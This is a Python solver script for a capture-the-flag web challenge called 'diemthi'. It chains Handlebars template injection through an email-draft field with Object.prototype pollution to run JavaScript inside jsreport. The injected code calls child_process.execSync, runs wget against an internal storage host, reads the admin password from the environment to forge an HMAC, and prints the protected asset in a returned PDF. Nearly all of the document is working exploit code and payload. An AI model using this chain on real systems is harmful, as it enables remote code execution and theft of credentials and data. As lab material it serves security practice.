#!/usr/bin/env python3
"""End-to-end solver for the local CSCV2026 `diemthi` challenge.

The solver stages a Handlebars payload through the no-SMTP email draft path,
then renders the returned .eml as a jsreport template.  The generated
JavaScript obtains the internal-storage nonce, computes the HMAC with the
jsreport admin password already present in the jsreport process, and prints
the authenticated asset response in the returned PDF.

Usage:
    python3 solve.py http://127.0.0.1:3000

The local challenge must be running in draft mode (SMTP_HOST unset).  The
application's early no-SMTP rejection must also be removed so /api/email can
reach server/mail.js's documented streamTransport draft branch.
"""

from __future__ import annotations

import argparse
import json
import re
import shutil
import subprocess
import sys
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen


GADGET_LINES = [
    "{{#with (O.getOwnPropertyDescriptors (O.getPrototypeOf a)) as |D|}}",
    "{{#with (@root.O.getPrototypeOf @root) as |P|}}",
    "{{@root.O.defineProperties P D}}",
    "{{@root.O.assign P @root.y}}",
    "{{/with}}",
    "{{/with}}",
    "{{#with (O.getOwnPropertyDescriptor (O.getPrototypeOf O) c)}}",
    '{{@root.O.defineProperty @root "F" this}}',
    "{{/with}}",
    "{{#with (F)}}{{.}}{{/with}}",
]


# Each tag is kept on its own short line.  Nodemailer's stream transport uses
# quoted-printable encoding, so padding prevents soft-wraps from splitting a
# Handlebars expression in the .eml file.
def build_injected_name() -> str:
    lines = ["P" * 51]
    for tag in GADGET_LINES:
        lines.append(tag + "P" * max(0, 60 - len(tag)))
        lines.append("P" * 51)
    return "\n".join(lines)


# The Object.assign call above also copies Handlebars' helper-options fields
# onto Object.prototype.  Node 12's child_process environment enumeration
# then tries to coerce those inherited objects.  Remove them before spawning.
JAVASCRIPT = r'''delete Object.prototype[0];delete Object.prototype.name;delete Object.prototype.hash;delete Object.prototype.data;delete Object.prototype.blockParams;delete Object.prototype.loc;delete Object.prototype.length;Object.defineProperty(Object.prototype,'constructor',{value:Object,writable:true,configurable:true});const cp=process.mainModule.require('child_process');const crypto=process.mainModule.require('crypto');const nonce=JSON.parse(cp.execSync('wget -qO- http://internal-storage/challenge').toString()).nonce;const proof=crypto.createHmac('sha256',process.env.extensions_authentication_admin_password).update(nonce).digest('hex');return cp.execSync("wget -qO- --header='Origin: http://diemthi/' --header='X-Asset-Nonce: "+nonce+"' --header='X-Report-Proof: "+proof+"' --post-data='' http://internal-storage/assets/").toString()'''


def post_form(base_url: str, path: str, fields: dict[str, str], timeout: float) -> tuple[int, bytes]:
    request = Request(
        base_url.rstrip("/") + path,
        data=urlencode(fields).encode(),
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    try:
        with urlopen(request, timeout=timeout) as response:
            return response.status, response.read()
    except HTTPError as error:
        return error.code, error.read()
    except (OSError, URLError) as error:
        raise RuntimeError(f"request to {path} failed: {error}") from error


def extract_text(pdf_path: Path) -> str:
    pdftotext = shutil.which("pdftotext")
    if not pdftotext:
        return ""
    result = subprocess.run(
        [pdftotext, "-layout", str(pdf_path), "-"],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        check=False,
    )
    return result.stdout.decode("utf-8", errors="replace")


def main() -> int:
    parser = argparse.ArgumentParser(description="Solve the diemthi web challenge")
    parser.add_argument("base_url", nargs="?", default="http://127.0.0.1:3000")
    parser.add_argument("--email", default="attacker@example.invalid")
    parser.add_argument("--out", default="e2e-final.pdf", help="save the returned PDF here")
    parser.add_argument("--timeout", type=float, default=90.0)
    args = parser.parse_args()

    # Stage 1: put the Handlebars expressions into the greeting field.  The
    # mail route returns the generated draft filename to the caller.
    email_status, email_body = post_form(
        args.base_url,
        "/api/email",
        {
            "template": "score-report",
            "data": "{}",
            "name": build_injected_name(),
            "email": args.email,
        },
        args.timeout,
    )
    if email_status != 200:
        detail = email_body.decode("utf-8", errors="replace")
        print(f"[-] /api/email returned HTTP {email_status}: {detail}", file=sys.stderr)
        print("    Ensure SMTP_HOST is unset and the early no-SMTP guard is removed.", file=sys.stderr)
        return 1

    try:
        email_result = json.loads(email_body)
        draft_name = email_result["file"]
    except (ValueError, KeyError, TypeError) as error:
        print(f"[-] unexpected /api/email response: {email_body!r}", file=sys.stderr)
        print(f"    parse error: {error}", file=sys.stderr)
        return 1

    print(f"[+] draft: {draft_name}")

    # Stage 2: the data object supplies Object through the resolver's inherited
    # `constructor` property and supplies the JavaScript as an array-like
    # object.  The absolute draft path is accepted by loadTemplate().
    data = {
        "$id": "r",
        "O": {"$ref": "constructor"},
        "a": [],
        "c": "constructor",
        "y": {"0": JAVASCRIPT, "length": 1},
    }
    export_status, pdf = post_form(
        args.base_url,
        "/api/export",
        {
            "template": f"/app/data/mail-drafts/{draft_name}",
            "data": json.dumps(data, separators=(",", ":")),
        },
        args.timeout,
    )
    if export_status != 200 or not pdf.startswith(b"%PDF"):
        print(f"[-] /api/export returned HTTP {export_status}: {pdf[:500]!r}", file=sys.stderr)
        return 1

    output = Path(args.out)
    output.write_bytes(pdf)
    text = extract_text(output)
    # The injected tag is followed by P padding, so the returned marker is
    # extracted as `ASSETSP...`; matching that prefix avoids counting the
    # word `assets` in the URL embedded in the rendered JavaScript.
    assets = re.findall(r"ASSETSP+", text)
    flag_like = re.findall(r"(?:CSCV2026|FLAG)\{[^}\r\n]+\}", text)

    print(f"[+] PDF: {output} ({len(pdf)} bytes)")
    if flag_like:
        for value in dict.fromkeys(flag_like):
            print(f"[FLAG] {value}")
    elif assets:
        print(f"[+] authenticated asset response: ASSETS (occurrences: {len(assets)})")
        print("    The checked-in local internal-storage/assets.txt contains the marker ASSETS.")
    else:
        print("[!] PDF returned, but no known marker was found in extracted text.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
